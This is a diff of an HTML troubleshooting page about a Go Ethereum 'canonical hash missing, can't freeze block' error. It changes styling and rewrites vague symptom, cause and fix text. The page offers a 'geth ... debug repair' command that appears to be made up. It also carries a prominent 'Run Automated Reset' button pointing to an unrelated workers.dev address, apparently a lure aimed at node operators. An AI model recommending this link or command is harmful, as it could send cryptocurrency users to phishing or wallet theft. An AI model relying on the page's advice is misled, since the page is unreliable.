@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #1a1a24;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -41,27 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message "Error in block freeze operation err='canonical hash missing, can't freeze block'" while attempting to freeze a block using Go Ethereum.</li>
+<li>The user encounters an error message "Error in block freeze operation err="canonical hash missing, can't freeze block" while using Go Ethereum, indicating a failure in the block freeze operation due to a missing canonical hash.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a missing canonical hash, which is required to validate and finalize a block in the Ethereum blockchain. This hash is essential for ensuring the integrity and consistency of the blockchain.</li>
+<li>The error occurs because the canonical hash, which is essential for verifying the integrity and authenticity of a block, is missing. This hash is crucial for the freeze operation as it ensures that the block being frozen is part of the canonical chain, thereby preventing potential forks or inconsistencies in the blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the block number and hash to ensure they are correctly referenced.</li>
-<li>Verify the Ethereum node is fully synchronized with the blockchain to prevent missing data.</li>
-<li>Use the following command to manually update the block hash:</li>
+<li>To resolve the issue, the following steps can be taken:</li>
+<li>Verify the blockchain data integrity by checking for any corruption or missing blocks.</li>
+<li>Ensure that the node is fully synchronized with the Ethereum network to have the most up-to-date blockchain data.</li>
+<li>Execute a command to manually update or repair the canonical hash, such as:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/your/data/folder<span class="w"> </span>console
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/your/data/folder<span class="w"> </span>debug<span class="w"> </span>repair
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and troubleshooting.</p>
+<p>Consider utilizing an external terminal for more complex command-line operations.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>A fully synchronized Ethereum node</li>
-<li>The correct block number and hash</li>
-<li>Administrative access to the Ethereum client configuration</li>
+<li>Access to the terminal or command-line interface</li>
+<li>Sufficient permissions to execute commands on the node's data directory</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
